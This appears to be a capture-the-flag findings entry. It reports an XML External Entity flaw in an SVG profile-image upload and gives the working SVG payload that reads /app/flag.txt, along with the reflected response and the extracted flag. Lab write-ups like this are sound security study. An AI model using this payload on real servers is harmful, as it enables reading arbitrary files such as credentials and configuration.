findings.title: XXE via SVG Profile Image Upload — Flag Extracted
findings.description:
The profile image upload endpoint accepts SVG files without sanitization. An attacker can embed an XML External Entity (XXE) declaration in the SVG that reads arbitrary files from the server filesystem. The server parses the SVG with a full XML parser, resolves the external entity, and reflects the file contents back in the rendered HTML response.

The flag file at /app/flag.txt was read using a crafted SVG with a DOCTYPE that declares a file:// external entity.
findings.evidence:
Uploaded SVG payload:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///app/flag.txt">]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text x="10" y="100">&xxe;</text>
</svg>

Server response reflected:
<text x="10" y="100">flag{c86ecb0c-4b5c-4151-8fd7-344a76f5cd8f}</text>

FLAG: flag{c86ecb0c-4b5c-4151-8fd7-344a76f5cd8f}
